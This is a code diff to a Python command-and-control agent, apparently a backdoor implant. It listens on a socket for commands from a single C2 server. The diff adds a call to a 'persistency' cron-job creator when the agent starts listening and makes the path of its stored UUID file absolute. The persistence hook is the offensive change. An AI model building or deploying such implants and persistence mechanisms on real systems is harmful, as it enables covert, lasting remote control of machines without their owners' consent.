@@ -6,6 +6,7 @@ sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../')
 
 from protocol import validator
 from agent.agent_connection_handler import ConnectionHandler
+from agent.persistency import cronjob_creator
 import socket
 import argparse
 import uuid
@@ -30,8 +31,10 @@ def parse_arguments():
 def generate_agent_uuid():
     print("[+] Trying to get agent's UUID from path")
     # try to read the agent's uuid from local file first
-    if os.path.isfile("uuid"):
-        with open("uuid", 'r') as f:
+    agent_root_dir = os.path.dirname(os.path.abspath(__file__))
+    uuid_file_path = os.path.join(agent_root_dir, "uuid")
+    if os.path.isfile(uuid_file_path):
+        with open(uuid_file_path, 'r') as f:
             agent_uuid = f.read()
             print(f"[+] UUID found: {agent_uuid}")
             return agent_uuid
@@ -39,7 +42,7 @@ def generate_agent_uuid():
     print("[-] agent's UUID not found on path. Generating new UUID")
     # generate new uuid if first run
     agent_uuid = str(uuid.uuid4())[:8] #first 8 chars from the uuid4 strings
-    with open("uuid", 'w') as f:
+    with open(uuid_file_path, 'w') as f:
         f.write(agent_uuid)
 
     print(f"[+] UUID found: {agent_uuid}")
@@ -58,15 +61,17 @@ class ThreadedServer:
         validator.validate_port(src_port)
         self.src_port = src_port
         # todo: #to-fill
-
         self.client_handlers = []
+
 
     # todo: #to-fill
     def start(self):
         print(f"[+] Trying to bind {self.src_ip}:{self.src_port}")
         self.server_socket.bind((self.src_ip, self.src_port))
         print(f"[+] Server listening on {self.src_ip}:{self.src_port}")
-        self.server_socket.listen(1)  # we expect to receive commands from only 1 connecting C2 server
+        self.server_socket.listen(1)  # we expect to receive commands from only one connecting C2 server
+        cronjob_creator.create(self.src_port) # register the server in cron job
+
         print(f"[+] Waiting for incoming connections")
         try:
             while True:
